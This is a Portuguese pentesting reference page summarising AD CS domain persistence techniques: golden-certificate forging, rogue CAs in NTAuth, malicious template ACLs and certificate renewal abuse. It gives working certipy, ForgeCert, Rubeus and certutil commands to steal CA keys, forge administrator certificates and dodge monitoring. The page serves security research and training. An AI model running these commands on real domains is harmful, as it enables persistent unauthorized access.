# Persistência de Domínio do AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Este é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte-o para obter mais detalhes.<sup>[[5]](#references)</sup>

## Forjando Certificados com Certificados de CA Roubados (Golden Certificate) - DPERSIST1

Como saber se um certificado é um certificado de CA?

Pode-se determinar que um certificado é um certificado de CA se várias condições forem atendidas:<sup>[[5]](#references)</sup>

- O certificado está armazenado no servidor da CA, com sua chave privada protegida pela DPAPI da máquina ou por hardware, como um TPM/HSM, se o sistema operacional oferecer suporte.
- Os campos Issuer e Subject do certificado correspondem ao nome distinto da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados de CA.
- O certificado não possui campos Extended Key Usage (EKU).

Para extrair a chave privada deste certificado, a ferramenta `certsrv.msc` no servidor da CA é o método compatível por meio da GUI integrada. No entanto, este certificado não difere dos demais armazenados no sistema; portanto, métodos como a [técnica THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser aplicados para a extração.

O certificado e a chave privada também podem ser obtidos usando o Certipy com o seguinte comando:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Após obter o certificado da CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> O usuário alvo da falsificação de certificado deve estar ativo e ser capaz de se autenticar no Active Directory para que o processo seja bem-sucedido. Forjar um certificado para contas especiais, como krbtgt, é ineficaz.

Este certificado forjado será **válido** até a data final especificada e **enquanto o certificado da CA raiz for válido** (normalmente de 5 a **10+ anos**). Ele também é válido para **máquinas**, portanto, combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** enquanto o certificado da CA for válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

### Operando sob Strong Certificate Mapping Enforcement (2025+)

Desde 11 de fevereiro de 2025 (após a implementação da KB5014754), os controladores de domínio usam, por padrão, o modo **Full Enforcement** para mapeamentos de certificados. Na prática, isso significa que seus certificados forjados devem:

- Conter uma vinculação forte à conta alvo (por exemplo, a extensão de segurança SID), ou
- Ser associados a um mapeamento forte e explícito no atributo `altSecurityIdentities` do objeto alvo.<sup>[[1]](#references)</sup>

Uma abordagem confiável para persistência é criar um certificado forjado encadeado à Enterprise CA roubada e, em seguida, adicionar um mapeamento forte e explícito ao principal vítima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Observações
- Se você conseguir criar certificados forjados que incluam a extensão de segurança SID, eles serão mapeados implicitamente mesmo sob Full Enforcement. Caso contrário, prefira mapeamentos fortes explícitos. Consulte [account-persistence](account-persistence.md) para saber mais sobre mapeamentos explícitos.
- A revogação não ajuda os defensores neste caso: certificados forjados são desconhecidos pelo banco de dados da CA e, portanto, não podem ser revogados.

#### Forjamento compatível com Full-Enforcement (ciente de SID)

Ferramentas atualizadas permitem incorporar o SID diretamente, mantendo os certificados golden utilizáveis mesmo quando os DCs rejeitam mapeamentos fracos:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Ao incorporar o SID, você evita ter que tocar em `altSecurityIdentities`, que pode ser monitorado, e ainda satisfaz as verificações de mapeamento forte.

## Confiando em certificados CA Rogue - DPERSIST2

O objeto `NTAuthCertificates` é definido para conter um ou mais **certificados CA** em seu atributo `cacertificate`, utilizado pelo Active Directory (AD). O processo de verificação pelo **controlador de domínio** envolve verificar no objeto `NTAuthCertificates` uma entrada correspondente à **CA especificada** no campo Issuer do **certificado** de autenticação. A autenticação prossegue se uma correspondência for encontrada.<sup>[[5]](#references)</sup>

Um certificado CA autoassinado pode ser adicionado ao objeto `NTAuthCertificates` por um atacante, desde que ele tenha controle sobre esse objeto do AD. Normalmente, apenas membros do grupo **Enterprise Admin**, além de **Domain Admins** ou **Administrators** no **domínio raiz da floresta**, recebem permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` ou usando a [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionais úteis para essa técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Essa capacidade é especialmente relevante quando usada em conjunto com um método descrito anteriormente que envolve o ForgeCert para gerar certificados dinamicamente.

> Considerações sobre o mapeamento pós-2025: colocar uma CA não autorizada no NTAuth apenas estabelece confiança na CA emissora. Para usar certificados leaf para logon quando os DCs estão em **Full Enforcement**, o leaf deve conter a extensão de segurança SID ou deve existir um mapeamento explícito forte no objeto-alvo (por exemplo, Issuer+Serial em `altSecurityIdentities`). Consulte {{#ref}}account-persistence.md{{#endref}}.

## Configuração maliciosa - DPERSIST3

As oportunidades de **persistence** por meio de modificações nos **security descriptors** dos componentes do AD CS são numerosas. As modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui a adição de "control rights" (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis, como:<sup>[[5]](#references)</sup>

- O objeto de computador AD do **servidor CA**
- O **servidor RPC/DCOM do servidor CA**
- Qualquer **objeto ou contêiner AD descendente** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o contêiner Certificate Templates, o contêiner Certification Authorities, o objeto NTAuthCertificates etc.)
- **Grupos AD aos quais foram delegados direitos para controlar o AD CS** por padrão ou pela organização (como o grupo interno Cert Publishers e qualquer um de seus membros)

Um exemplo de implementação maliciosa envolveria um atacante que possui **permissões elevadas** no domínio adicionando a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, sendo o atacante o principal dessa permissão. Para explorar isso, o atacante primeiro alteraria para si mesmo a propriedade do template **`User`**. Em seguida, o **`mspki-certificate-name-flag`** seria definido como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na solicitação. Posteriormente, o atacante poderia fazer **enroll** usando o **template**, escolhendo o nome de um **domain administrator** como nome alternativo e utilizando o certificado obtido para autenticar-se como DA.

Practical knobs que os atacantes podem definir para obter persistence de longo prazo no domínio (consulte {{#ref}}domain-escalation.md{{#endref}} para obter detalhes completos e informações sobre detecção):

- Sinalizadores de política da CA que permitem SANs dos solicitantes (por exemplo, habilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém exploráveis os caminhos semelhantes ao ESC1.
- DACLs ou configurações de template que permitem a emissão com capacidade de autenticação (por exemplo, adicionando o EKU Client Authentication e habilitando `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controle do objeto `NTAuthCertificates` ou dos contêineres da CA para reintroduzir continuamente emissores não autorizados caso os defensores tentem realizar a limpeza.

> [!TIP]
> Em ambientes hardened após o KB5014754, combinar essas configurações incorretas com mapeamentos explícitos fortes (`altSecurityIdentities`) garante que seus certificados emitidos ou forjados continuem utilizáveis mesmo quando os DCs impõem um mapeamento forte.

### Abuso da renovação de certificados (ESC14) para persistence

Se você comprometer um certificado com capacidade de autenticação (ou um certificado de Enrollment Agent), poderá **renová-lo indefinidamente**, desde que o template emissor continue publicado e sua CA ainda confie na cadeia do emissor. A renovação mantém os vínculos de identidade originais, mas estende a validade, dificultando a remoção, a menos que o template seja corrigido ou a CA seja republicada.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Se os controladores de domínio estiverem em **Full Enforcement**, adicione `-sid <victim SID>` (ou use um template que ainda inclua a extensão de segurança SID) para que o certificado leaf renovado continue sendo mapeado fortemente sem tocar em `altSecurityIdentities`. Attackers com direitos de administrador da CA também podem ajustar `policy\RenewalValidityPeriodUnits` para prolongar os períodos de validade dos certificados renovados antes de emitirem um certificado para si mesmos.<sup>[[2]](#references)[[4]](#references)</sup>


## Referências

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
